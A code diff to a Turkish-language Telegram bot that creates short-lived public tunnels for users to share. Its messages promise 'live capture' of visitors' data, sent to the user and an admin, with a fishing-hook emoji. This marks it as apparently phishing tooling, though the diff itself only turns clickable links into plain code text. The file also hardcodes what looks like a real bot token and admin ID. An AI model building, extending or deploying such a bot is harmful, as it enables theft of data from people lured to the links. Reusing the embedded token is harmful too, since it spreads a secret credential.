@@ -1,3 +1,4 @@
+
 import asyncio
 import json
 import os
@@ -12,7 +13,7 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Cont
 nest_asyncio.apply()
 
 # ═══════════════════════════════════════════════════════════════
-BOT_TOKEN = "8366855341:AAHauyMwWYcruSFAddfTwnlGdcs1UKWyFuo"  # ← Güncel token
+BOT_TOKEN = "8366855341:AAHauyMwWYcruSFAddfTwnlGdcs1UKWyFuo"
 ADMIN_ID = 7999336769
 
 PORT_RANGE = [8080, 8081, 8082, 3000, 3001, 4444]
@@ -563,7 +564,7 @@ async def create_tunnel(query, user_id):
         remain = int(tunnel['end_time'] - time.time())
         if remain > 0:
             kb = [[InlineKeyboardButton("❌ Kapat", callback_data=f"kill_{user_id}")]]
-            text = f"⏳ *Aktif tunnel:* [Tıkla ve aç]({tunnel['url']})\n⏰ *Kalan:* `{remain//60}m {remain%60:02d}s`"
+            text = f"⏳ *Aktif tunnel:* `{tunnel['url']}`\n⏰ *Kalan:* `{remain//60}m {remain%60:02d}s`"
             await edit_with_back(query, text, kb)
             return
 
@@ -588,7 +589,7 @@ async def create_tunnel(query, user_id):
         kb = [[InlineKeyboardButton("🔒 Kapat", callback_data=f"kill_{user_id}")]]
         text = (
             f"✅ **TUNNEL HAZIR!**\n\n"
-            f"🔗 [Tıkla ve paylaş!]({url})\n"
+            f"🔗 `{url}`\n"
             f"⏰ **10 dakika** aktif\n"
             f"📱 **Paylaşın!**\n\n"
             f"*Live capture sana ve admine!* 🎣"
@@ -601,7 +602,7 @@ async def create_tunnel(query, user_id):
                     ADMIN_ID,
                     f"🆕 **Yeni tunnel!**\n"
                     f"👤 `{query.from_user.first_name}` (`{user_id}`)\n"
-                    f"🔗 [Tıkla]({url})",
+                    f"🔗 `{url}`",
                     parse_mode='Markdown'
                 )
             except:
